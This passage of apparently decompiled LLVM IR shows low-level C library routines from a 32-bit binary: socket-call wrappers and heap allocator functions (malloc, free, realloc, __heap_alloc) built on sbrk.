  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_d2cc = call i32 @sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32 0)
  store i32 %v5_d2cc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_d2cc, -4095
  br i1 %tmp, label %dec_label_pc_d2ec, label %dec_label_pc_d2dc

dec_label_pc_d2dc:                                ; preds = %entry
  %v0_d2dc = call i32 @__errno_location()
  %v0_d2e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_d2e0 = sub i32 0, %v0_d2e0
  %v2_d2e4 = inttoptr i32 %v0_d2dc to i32*
  store i32 %v1_d2e0, i32* %v2_d2e4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d2ec

dec_label_pc_d2ec:                                ; preds = %entry, %dec_label_pc_d2dc
  %v0_d2ec = phi i32 [ %v5_d2cc, %entry ], [ -1, %dec_label_pc_d2dc ]
  %v2_d2f0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_d2f0, i32* @r4, align 4
  ret i32 %v0_d2ec

; uselistorder directives
  uselistorder i32 %v5_d2cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d2ec, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d2f4 = load i32, i32* @r4, align 4
  store i32 %v3_d2f4, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_d2fc = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  store i32 %v5_d2fc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_d2fc, -4095
  br i1 %tmp, label %dec_label_pc_d31c, label %dec_label_pc_d30c

dec_label_pc_d30c:                                ; preds = %entry
  %v0_d30c = call i32 @__errno_location()
  %v0_d310 = load i32, i32* %r4.global-to-local, align 4
  %v1_d310 = sub i32 0, %v0_d310
  %v2_d314 = inttoptr i32 %v0_d30c to i32*
  store i32 %v1_d310, i32* %v2_d314, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d31c

dec_label_pc_d31c:                                ; preds = %entry, %dec_label_pc_d30c
  %v0_d31c = phi i32 [ %v5_d2fc, %entry ], [ -1, %dec_label_pc_d30c ]
  %v2_d320 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d320, i32* @r4, align 4
  ret i32 %v0_d31c

; uselistorder directives
  uselistorder i32 %v5_d2fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d31c, { 1, 0 }
}

define i32 @socket() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d324 = load i32, i32* @r4, align 4
  store i32 %v3_d324, i32* %stack_var_-8, align 4
  %v0_d328 = call i32 @socket()
  store i32 %v0_d328, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_d328, -4095
  br i1 %tmp, label %dec_label_pc_d348, label %dec_label_pc_d338

dec_label_pc_d338:                                ; preds = %entry
  %v0_d338 = call i32 @__errno_location()
  %v0_d33c = load i32, i32* %r4.global-to-local, align 4
  %v1_d33c = sub i32 0, %v0_d33c
  %v2_d340 = inttoptr i32 %v0_d338 to i32*
  store i32 %v1_d33c, i32* %v2_d340, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d348

dec_label_pc_d348:                                ; preds = %entry, %dec_label_pc_d338
  %v0_d348 = phi i32 [ %v0_d328, %entry ], [ -1, %dec_label_pc_d338 ]
  %v2_d34c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d34c, i32* @r4, align 4
  ret i32 %v0_d348

; uselistorder directives
  uselistorder i32 %v0_d328, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d348, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_d350 = load i32, i32* @r4, align 4
  %v6_d350 = load i32, i32* @r5, align 4
  %v9_d350 = load i32, i32* @r6, align 4
  %v0_d354 = load i32, i32* %r0.global-to-local, align 4
  %v2_d354 = icmp eq i32 %v0_d354, 0
  %v2_d358 = ptrtoint i32* %stack_var_-20 to i32
  br i1 %v2_d354, label %bb, label %dec_label_pc_d364

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d36c

dec_label_pc_d364:                                ; preds = %entry
  %tmp = icmp ugt i32 %v0_d354, -8
  br i1 %tmp, label %dec_label_pc_d470, label %dec_label_pc_d36c

dec_label_pc_d36c:                                ; preds = %bb, %dec_label_pc_d364
  %v0_d36c = phi i32 [ %v0_d354, %dec_label_pc_d364 ], [ 1, %bb ]
  %v1_d36c = add i32 %v0_d36c, 4
  store i32 %v1_d36c, i32* %stack_var_-20, align 4
  store i32 %v2_d358, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1fdf0.535 to i32), i32* %r0.global-to-local, align 4
  %v1_d384 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_1d5b0.539 to i32), i32* %r0.global-to-local, align 4
  %v3_d390 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_1d5b0.539 to i32*), i32 %v2_d358)
  store i32 %v3_d390, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1fdf0.535 to i32), i32* %r0.global-to-local, align 4
  store i32 54184, i32* @lr, align 4
  %v1_d3a4 = call i32 @__pthread_return_0()
  store i32 %v1_d3a4, i32* %r0.global-to-local, align 4
  %v2_d3a8 = icmp eq i32 %v3_d390, 0
  br i1 %v2_d3a8, label %dec_label_pc_d3b0, label %dec_label_pc_d460

dec_label_pc_d3b0:                                ; preds = %dec_label_pc_d36c
  %v2_d3b4 = load i32, i32* @global_var_1fe18.395, align 4
  store i32 %v2_d3b4, i32* @r4, align 4
  %v2_d3b8 = load i32, i32* %stack_var_-20, align 4
  %v3_d3bc = icmp ult i32 %v2_d3b8, %v2_d3b4
  br i1 %v3_d3bc, label %.thread3, label %bb14

bb14:                                             ; preds = %dec_label_pc_d3b0
  %v3_d3c0 = add i32 %v2_d3b4, -1
  %v2_d3c4 = add i32 %v3_d3c0, %v2_d3b8
  %v2_d3c8 = sub i32 0, %v2_d3b4
  %v3_d3cc = and i32 %v2_d3c4, %v2_d3c8
  store i32 %v3_d3cc, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_d3b0, %bb14
  store i32 ptrtoint (i32* @global_var_1fe78.543 to i32), i32* %r0.global-to-local, align 4
  %v1_d3d8 = call i32 @__pthread_return_0()
  %v0_d3dc = load i32, i32* @r4, align 4
  store i32 %v0_d3dc, i32* %r0.global-to-local, align 4
  %v1_d3e0 = call i32 @__GI_sbrk(i32 %v0_d3dc)
  store i32 %v1_d3e0, i32* %r0.global-to-local, align 4
  %v7_d3e4 = icmp eq i32 %v1_d3e0, -1
  br i1 %v7_d3e4, label %bb15, label %dec_label_pc_d3f0

bb15:                                             ; preds = %.thread3
  store i32 %v1_d3e0, i32* @r5, align 4
  br label %dec_label_pc_d404

dec_label_pc_d3f0:                                ; preds = %.thread3
  %v1_d3f0 = add i32 %v1_d3e0, 3
  %v1_d3f4 = and i32 %v1_d3f0, -4
  store i32 %v1_d3f4, i32* @r5, align 4
  %v9_d3f8 = icmp eq i32 %v1_d3f4, %v1_d3e0
  br i1 %v9_d3f8, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_d3f0
  %v3_d3fc = sub i32 %v1_d3f4, %v1_d3e0
  store i32 %v3_d3fc, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_d3f0, %bb16
  %v1_d400 = xor i1 %v9_d3f8, true
  call void @__pseudo_cond_branch(i1 %v1_d400, i32 ptrtoint (i32* @global_var_ebf4.544 to i32))
  br label %dec_label_pc_d404

dec_label_pc_d404:                                ; preds = %bb15, %bb17
  store i32 ptrtoint (i32* @global_var_1fe78.543 to i32), i32* %r0.global-to-local, align 4
  store i32 54292, i32* @lr, align 4
  %v1_d410 = call i32 @__pthread_return_0()
  store i32 %v1_d410, i32* %r0.global-to-local, align 4
  %v0_d414 = load i32, i32* @r5, align 4
  %v7_d414 = icmp eq i32 %v0_d414, -1
  br i1 %v7_d414, label %dec_label_pc_d470, label %dec_label_pc_d41c

dec_label_pc_d41c:                                ; preds = %dec_label_pc_d404
  store i32 ptrtoint (i32* @global_var_1fdf0.535 to i32), i32* %r0.global-to-local, align 4
  %v1_d428 = call i32 @__pthread_return_0()
  %v0_d42c = load i32, i32* @r4, align 4
  %v0_d430 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_1d5b0.539 to i32), i32* %r0.global-to-local, align 4
  %sext = mul i32 %v0_d430, 16777216
  %v2_d438 = sdiv i32 %sext, 16777216
  %v5_d438 = call i32 @__heap_free(i32* bitcast (i32** @global_var_1d5b0.539 to i32*), i32 %v2_d438, i32 %v0_d42c)
  store i32 ptrtoint (i32** @global_var_1d5b0.539 to i32), i32* %r0.global-to-local, align 4
  %v3_d444 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_1d5b0.539 to i32*), i32 %v2_d358)
  store i32 %v3_d444, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1fdf0.535 to i32), i32* %r0.global-to-local, align 4
  store i32 54360, i32* @lr, align 4
  %v1_d454 = call i32 @__pthread_return_0()
  store i32 %v1_d454, i32* %r0.global-to-local, align 4
  %v2_d458 = icmp eq i32 %v3_d444, 0
  br i1 %v2_d458, label %dec_label_pc_d470, label %dec_label_pc_d460

dec_label_pc_d460:                                ; preds = %dec_label_pc_d36c, %dec_label_pc_d41c
  %v1_d464 = phi i32 [ %v3_d390, %dec_label_pc_d36c ], [ %v3_d444, %dec_label_pc_d41c ]
  %v2_d460 = load i32, i32* %stack_var_-20, align 4
  %v2_d464 = inttoptr i32 %v1_d464 to i32*
  store i32 %v2_d460, i32* %v2_d464, align 4
  %v3_d464 = load i32, i32* %r4.global-to-local, align 4
  %v4_d464 = add i32 %v3_d464, 4
  store i32 %v4_d464, i32* %r4.global-to-local, align 4
  %v2_d468 = icmp eq i32 %v4_d464, 0
  br i1 %v2_d468, label %dec_label_pc_d470, label %dec_label_pc_d480

dec_label_pc_d470:                                ; preds = %dec_label_pc_d460, %dec_label_pc_d41c, %dec_label_pc_d404, %dec_label_pc_d364
  %v0_d470 = call i32 @__errno_location()
  store i32 %v0_d470, i32* %r0.global-to-local, align 4
  %v2_d478 = inttoptr i32 %v0_d470 to i32*
  store i32 12, i32* %v2_d478, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d480

dec_label_pc_d480:                                ; preds = %dec_label_pc_d460, %dec_label_pc_d470
  %v0_d480 = phi i32 [ %v4_d464, %dec_label_pc_d460 ], [ 0, %dec_label_pc_d470 ]
  store i32 %v0_d480, i32* %r0.global-to-local, align 4
  store i32 %v3_d350, i32* @r4, align 4
  store i32 %v6_d350, i32* @r5, align 4
  store i32 %v9_d350, i32* @r6, align 4
  ret i32 %v0_d480

; uselistorder directives
  uselistorder i32 %v0_d480, { 1, 0 }
  uselistorder i32 %v3_d444, { 1, 0, 2 }
  uselistorder i32 %v1_d3f4, { 1, 0, 2 }
  uselistorder i32 %v1_d3e0, { 2, 0, 4, 3, 1, 5 }
  uselistorder i32 %v3_d390, { 1, 0, 2 }
  uselistorder i32 %v0_d354, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 5, 7, 2, 6, 8, 9, 10, 1, 12, 11, 16, 14, 13, 0, 15, 17, 18, 19, 3, 4 }
  uselistorder label %dec_label_pc_d480, { 1, 0 }
  uselistorder label %dec_label_pc_d460, { 1, 0 }
  uselistorder label %dec_label_pc_d404, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_d36c, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_d4a4 = load i32, i32* @r0, align 4
  %v2_d4a4 = icmp eq i32 %v0_d4a4, 0
  %v3_d4a8 = load i32, i32* @r4, align 4
  store i32 %v3_d4a8, i32* %stack_var_-24, align 4
  %v6_d4a8 = load i32, i32* @r5, align 4
  %v9_d4a8 = load i32, i32* @r6, align 4
  %v15_d4a8 = load i32, i32* @r8, align 4
  br i1 %v2_d4a4, label %bb, label %bb11

bb:                                               ; preds = %entry
  ret i32 0

bb11:                                             ; preds = %entry
  %v1_d4b0 = add i32 %v0_d4a4, -4
  %v2_d4b0 = inttoptr i32 %v1_d4b0 to i32*
  %v3_d4b0 = load i32, i32* %v2_d4b0, align 4
  store i32 %v3_d4b0, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_1d5b0.539 to i32), i32* %r8.global-to-local, align 4
  store i32 %v1_d4b0, i32* @r4, align 4
  %v1_d4c8 = call i32 @__pthread_return_0()
  %v0_d4cc = load i32, i32* @r4, align 4
  %v0_d4d0 = load i32, i32* @r5, align 4
  %v4_d4d8 = call i32 @__heap_free(i32* bitcast (i32** @global_var_1d5b0.539 to i32*), i32 %v0_d4cc, i32 %v0_d4d0)
  %v1_d4e0 = inttoptr i32 %v4_d4d8 to i32*
  %v2_d4e0 = load i32, i32* %v1_d4e0, align 4
  store i32 %v2_d4e0, i32* %r6.global-to-local, align 4
  %v2_d4e4 = load i32, i32* @global_var_1fe18.395, align 4
  %v4_d4e8 = mul i32 %v2_d4e4, 8
  %v6_d4e8 = icmp ult i32 %v2_d4e0, %v4_d4e8
  store i32 %v4_d4d8, i32* @r4, align 4
  br i1 %v6_d4e8, label %dec_label_pc_d528, label %dec_label_pc_d4f4

dec_label_pc_d4f4:                                ; preds = %bb11
  %v1_d4fc = call i32 @__pthread_return_0()
  %v1_d504 = call i32 @__GI_sbrk(i32 0)
  %v0_d508 = load i32, i32* @r4, align 4
  %v1_d508 = add i32 %v0_d508, 12
  store i32 %v1_d508, i32* @r5, align 4
  %v9_d50c = icmp eq i32 %v1_d508, %v1_d504
  br i1 %v9_d50c, label %dec_label_pc_d530, label %dec_label_pc_d514

dec_label_pc_d514:                                ; preds = %dec_label_pc_d4f4
  %v1_d520 = call i32 @__pthread_return_0()
  br label %dec_label_pc_d528

dec_label_pc_d528:                                ; preds = %bb11, %dec_label_pc_d514, %bb14
  %v2_d528 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_d528, i32* @r4, align 4
  store i32 %v6_d4a8, i32* @r5, align 4
  store i32 %v9_d4a8, i32* %r6.global-to-local, align 4
  store i32 %v15_d4a8, i32* %r8.global-to-local, align 4
  %v0_d52c = call i32 @__pthread_return_0()
  %v0_d530.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d530

dec_label_pc_d530:                                ; preds = %dec_label_pc_d4f4, %dec_label_pc_d528
  %v1_d538 = phi i32 [ %v0_d508, %dec_label_pc_d4f4 ], [ %v0_d530.pre, %dec_label_pc_d528 ]
  %v1_d530 = add i32 %v1_d538, 4
  %v2_d530 = inttoptr i32 %v1_d530 to i32*
  %v3_d530 = load i32, i32* %v2_d530, align 4
  %v2_d534 = icmp eq i32 %v3_d530, 0
  br i1 %v2_d534, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_d530
  %v2_d538 = add i32 %v1_d538, 8
  %v3_d538 = inttoptr i32 %v2_d538 to i32*
  %v4_d538 = load i32, i32* %v3_d538, align 4
  %v3_d53c = add i32 %v3_d530, 8
  %v4_d53c = inttoptr i32 %v3_d53c to i32*
  store i32 %v4_d538, i32* %v4_d53c, align 4
  %v0_d540.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d530, %bb12
  %v0_d540 = phi i32 [ %v1_d538, %dec_label_pc_d530 ], [ %v0_d540.pre, %bb12 ]
  %v1_d540 = add i32 %v0_d540, 8
  %v2_d540 = inttoptr i32 %v1_d540 to i32*
  %v3_d540 = load i32, i32* %v2_d540, align 4
  %v1_d544 = add i32 %v0_d540, 4
  %v2_d544 = inttoptr i32 %v1_d544 to i32*
  %v3_d544 = load i32, i32* %v2_d544, align 4
  %v2_d548 = icmp eq i32 %v3_d540, 0
  br i1 %v2_d548, label %.thread1, label %bb13

bb13:                                             ; preds = %.thread
  %v3_d54c = add i32 %v3_d540, 4
  %v4_d54c = inttoptr i32 %v3_d54c to i32*
  store i32 %v3_d544, i32* %v4_d54c, align 4
  br label %bb14

.thread1:                                         ; preds = %.thread
  %v2_d550 = load i32, i32* %r8.global-to-local, align 4
  %v3_d550 = inttoptr i32 %v2_d550 to i32*
  store i32 %v3_d544, i32* %v3_d550, align 4
  br label %bb14

bb14:                                             ; preds = %bb13, %.thread1
  %v1_d560 = call i32 @__pthread_return_0()
  %v0_d564 = load i32, i32* %r6.global-to-local, align 4
  %v1_d564 = load i32, i32* @r4, align 4
  %v0_d56c = load i32, i32* @r5, align 4
  %v2_d564 = sub i32 12, %v0_d564
  %v1_d568 = add i32 %v2_d564, %v1_d564
  %v2_d56c = sub i32 %v1_d568, %v0_d56c
  %v1_d570 = call i32 @__GI_sbrk(i32 %v2_d56c)
  br label %dec_label_pc_d528

; uselistorder directives
  uselistorder i32 %v0_d540, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_sbrk, { 1, 0, 2 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_d530, { 1, 0 }
  uselistorder label %dec_label_pc_d528, { 2, 1, 0 }
}

define i32 @realloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_d594 = load i32, i32* @r4, align 4
  store i32 %v3_d594, i32* %stack_var_-24, align 4
  %v6_d594 = load i32, i32* @r5, align 4
  %v9_d594 = load i32, i32* @r6, align 4
  %v12_d594 = load i32, i32* @r7, align 4
  %v15_d594 = load i32, i32* @r8, align 4
  %v18_d594 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_d598 = icmp eq i32 %arg2, 0
  %v0_d59c = load i32, i32* @r0, align 4
  store i32 %v0_d59c, i32* @r7, align 4
  br i1 %v2_d598, label %dec_label_pc_d5a4, label %dec_label_pc_d5ac

dec_label_pc_d5a4:                                ; preds = %entry
  %v0_d5a4 = call i32 @free()
  %v0_d5b4.pre = load i32, i32* @r4, align 4
  %v2_d5b8.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_d5b4

dec_label_pc_d5ac:                                ; preds = %entry
  %v2_d5ac = icmp eq i32 %v0_d59c, 0
  br i1 %v2_d5ac, label %dec_label_pc_d5b4, label %dec_label_pc_d5c0

dec_label_pc_d5b4:                                ; preds = %dec_label_pc_d5ac, %dec_label_pc_d5a4
  %v2_d5b8 = phi i32 [ %v3_d594, %dec_label_pc_d5ac ], [ %v2_d5b8.pre, %dec_label_pc_d5a4 ]
  %v0_d5b4 = phi i32 [ %arg2, %dec_label_pc_d5ac ], [ %v0_d5b4.pre, %dec_label_pc_d5a4 ]
  store i32 %v2_d5b8, i32* @r4, align 4
  store i32 %v6_d594, i32* @r5, align 4
  store i32 %v9_d594, i32* @r6, align 4
  store i32 %v12_d594, i32* @r7, align 4
  store i32 %v18_d594, i32* @lr, align 4
  %v1_d5bc = call i32 @malloc(i32 %v0_d5b4)
  %v0_d5c0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d5c0

dec_label_pc_d5c0:                                ; preds = %dec_label_pc_d5ac, %dec_label_pc_d5b4
  %v0_d5d8 = phi i32 [ %v0_d59c, %dec_label_pc_d5ac ], [ %v1_d5bc, %dec_label_pc_d5b4 ]
  %v0_d5c0 = phi i32 [ %arg2, %dec_label_pc_d5ac ], [ %v0_d5c0.pre, %dec_label_pc_d5b4 ]
  %v1_d5c0 = add i32 %v0_d5c0, 7
  %v1_d5c4 = and i32 %v1_d5c0, -4
  store i32 %v1_d5c4, i32* @r5, align 4
  %v2_d5c8 = icmp ugt i32 %v1_d5c4, 10
  %v1_d5cc = add i32 %v0_d5d8, -4
  %v2_d5cc = inttoptr i32 %v1_d5cc to i32*
  %v3_d5cc = load i32, i32* %v2_d5cc, align 4
  store i32 %v3_d5cc, i32* @r6, align 4
  br i1 %v2_d5c8, label %bb14, label %bb

bb:                                               ; preds = %dec_label_pc_d5c0
  store i32 12, i32* @r5, align 4
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_d5c0, %bb
  %v0_d654 = phi i32 [ %v1_d5c4, %dec_label_pc_d5c0 ], [ 12, %bb ]
  store i32 %v1_d5cc, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_d654, %v3_d5cc
  br i1 %tmp, label %dec_label_pc_d5e0, label %dec_label_pc_d654

dec_label_pc_d5e0:                                ; preds = %bb14
  %v2_d5d4 = sub i32 %v0_d654, %v3_d5cc
  %v1_d5f0 = call i32 @__pthread_return_0()
  %v0_d5f8 = load i32, i32* @r8, align 4
  %v1_d5f8 = load i32, i32* @r6, align 4
  %v2_d5f8 = add i32 %v1_d5f8, %v0_d5f8
  %v4_d600 = call i32 @__heap_alloc_at(i32* bitcast (i32** @global_var_1d5b0.539 to i32*), i32 %v2_d5f8, i32 %v2_d5d4)
  store i32 %v4_d600, i32* @r4, align 4
  store i32 54808, i32* @lr, align 4
  %v1_d614 = call i32 @__pthread_return_0()
  %v0_d618 = load i32, i32* @r4, align 4
  %v2_d618 = icmp eq i32 %v0_d618, 0
  br i1 %v2_d618, label %dec_label_pc_d628, label %.thread

.thread:                                          ; preds = %dec_label_pc_d5e0
  %v1_d61c = load i32, i32* @r6, align 4
  %v3_d61c = add i32 %v1_d61c, %v0_d618
  %v2_d620 = load i32, i32* @r7, align 4
  %v3_d620 = add i32 %v2_d620, -4
  %v4_d620 = inttoptr i32 %v3_d620 to i32*
  store i32 %v3_d61c, i32* %v4_d620, align 4
  br label %dec_label_pc_d694

dec_label_pc_d628:                                ; preds = %dec_label_pc_d5e0
  %v0_d628 = load i32, i32* @r5, align 4
  %v1_d628 = add i32 %v0_d628, -4
  %v1_d62c = call i32 @malloc(i32 %v1_d628)
  store i32 %v1_d62c, i32* @r0, align 4
  store i32 %v1_d62c, i32* @r4, align 4
  %v2_d630 = icmp eq i32 %v1_d62c, 0
  br i1 %v2_d630, label %dec_label_pc_d64c, label %dec_label_pc_d638

dec_label_pc_d638:                                ; preds = %dec_label_pc_d628
  %v0_d638 = load i32, i32* @r6, align 4
  %v1_d638 = add i32 %v0_d638, -4
  store i32 %v1_d638, i32* @r2, align 4
  %v0_d63c = load i32, i32* @r7, align 4
  store i32 %v0_d63c, i32* @r1, align 4
  %v0_d640 = call i32 @memcpy()
  %v0_d644 = load i32, i32* @r7, align 4
  store i32 %v0_d644, i32* @r0, align 4
  %v0_d648 = call i32 @free()
  %v0_d64c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d64c

dec_label_pc_d64c:                                ; preds = %dec_label_pc_d628, %dec_label_pc_d638
  %v0_d64c = phi i32 [ 0, %dec_label_pc_d628 ], [ %v0_d64c.pre, %dec_label_pc_d638 ]
  store i32 %v0_d64c, i32* @r7, align 4
  br label %dec_label_pc_d694

dec_label_pc_d654:                                ; preds = %bb14
  %v1_d654 = add i32 %v0_d654, 28
  %tmp15 = icmp ugt i32 %v1_d654, %v3_d5cc
  br i1 %tmp15, label %dec_label_pc_d694, label %dec_label_pc_d660

dec_label_pc_d660:                                ; preds = %dec_label_pc_d654
  %v1_d66c = call i32 @__pthread_return_0()
  %v0_d670 = load i32, i32* @r8, align 4
  %v1_d670 = load i32, i32* @r5, align 4
  %v2_d670 = add i32 %v1_d670, %v0_d670
  %v1_d674 = load i32, i32* @r6, align 4
  %v2_d674 = sub i32 %v1_d674, %v1_d670
  %v4_d67c = call i32 @__heap_free(i32* bitcast (i32** @global_var_1d5b0.539 to i32*), i32 %v2_d670, i32 %v2_d674)
  store i32 54928, i32* @lr, align 4
  %v1_d68c = call i32 @__pthread_return_0()
  %v0_d690 = load i32, i32* @r5, align 4
  %v1_d690 = load i32, i32* @r7, align 4
  %v2_d690 = add i32 %v1_d690, -4
  %v3_d690 = inttoptr i32 %v2_d690 to i32*
  store i32 %v0_d690, i32* %v3_d690, align 4
  br label %dec_label_pc_d694

dec_label_pc_d694:                                ; preds = %.thread, %dec_label_pc_d654, %dec_label_pc_d64c, %dec_label_pc_d660
  %v0_d694 = load i32, i32* @r7, align 4
  store i32 %v9_d594, i32* @r6, align 4
  store i32 %v15_d594, i32* @r8, align 4
  ret i32 %v0_d694

; uselistorder directives
  uselistorder i32 %v1_d670, { 1, 0 }
  uselistorder i32 %v0_d654, { 1, 2, 0 }
  uselistorder i32 %v3_d5cc, { 0, 2, 1, 3 }
  uselistorder i32 (i32*, i32, i32)* @__heap_free, { 0, 2, 1 }
  uselistorder i32** @global_var_1d5b0.539, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_1d5b0.539 to i32*), { 1, 2, 0, 3, 4, 5 }
  uselistorder label %dec_label_pc_d694, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_d64c, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %dec_label_pc_d5c0, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v1_d6ac = inttoptr i32 %arg2 to i32*
  %v2_d6ac = load i32, i32* %v1_d6ac, align 4
  %v3_d6b0 = load i32, i32* @r4, align 4
  store i32 %v3_d6b0, i32* %stack_var_-8, align 4
  %v1_d6b4 = add i32 %v2_d6ac, 3
  %v1_d6b8 = and i32 %v1_d6b4, -4
  store i32 %v1_d6b8, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_d6c0 = icmp ugt i32 %v1_d6b8, 10
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_d6c8 = load i32, i32* %arg1, align 4
  store i32 %v2_d6c8, i32* %r0.global-to-local, align 4
  br i1 %v2_d6c0, label %dec_label_pc_d734.preheader, label %bb

bb:                                               ; preds = %entry
  store i32 12, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d734.preheader

dec_label_pc_d734.preheader:                      ; preds = %entry, %bb
  %v1_d6e8 = phi i32 [ %v1_d6b8, %entry ], [ 12, %bb ]
  %v2_d7349 = icmp eq i32 %v2_d6c8, 0
  br i1 %v2_d7349, label %dec_label_pc_d73c, label %dec_label_pc_d6d4

dec_label_pc_d6d4:                                ; preds = %dec_label_pc_d734.preheader, %dec_label_pc_d730
  %v2_d6ec = phi i32 [ %v3_d730, %dec_label_pc_d730 ], [ %v2_d6c8, %dec_label_pc_d734.preheader ]
  %v1_d6d4 = inttoptr i32 %v2_d6ec to i32*
  %v2_d6d4 = load i32, i32* %v1_d6d4, align 4
  store i32 %v2_d6d4, i32* @ip, align 4
  %v3_d6d8 = icmp ult i32 %v2_d6d4, %v1_d6e8
  br i1 %v3_d6d8, label %dec_label_pc_d730, label %dec_label_pc_d6e0

dec_label_pc_d6e0:                                ; preds = %dec_label_pc_d6d4
  %v1_d6e0 = add i32 %v1_d6e8, 44
  %v3_d6e4 = icmp ult i32 %v2_d6d4, %v1_d6e0
  br i1 %v3_d6e4, label %dec_label_pc_d6f4, label %.thread._crit_edge

.thread._crit_edge:                               ; preds = %dec_label_pc_d6e0
  %v2_d6d8.le = sub i32 %v2_d6d4, %v1_d6e8
  store i32 %v2_d6d8.le, i32* %v1_d6d4, align 4
  %v0_d720.pre = load i32, i32* @ip, align 4
  %v0_d728.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb29

dec_label_pc_d6f4:                                ; preds = %dec_label_pc_d6e0
  %v1_d6f4 = add i32 %v2_d6ec, 4
  %v2_d6f4 = inttoptr i32 %v1_d6f4 to i32*
  %v3_d6f4 = load i32, i32* %v2_d6f4, align 4
  store i32 %v3_d6f4, i32* %r2.global-to-local, align 4
  %v2_d6f8 = icmp eq i32 %v3_d6f4, 0
  br i1 %v2_d6f8, label %.thread2, label %bb27

bb27:                                             ; preds = %dec_label_pc_d6f4
  %v2_d6fc = add i32 %v2_d6ec, 8
  %v3_d6fc = inttoptr i32 %v2_d6fc to i32*
  %v4_d6fc = load i32, i32* %v3_d6fc, align 4
  %v3_d700 = add i32 %v3_d6f4, 8
  %v4_d700 = inttoptr i32 %v3_d700 to i32*
  store i32 %v4_d6fc, i32* %v4_d700, align 4
  %v0_d704.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_d6f4, %bb27
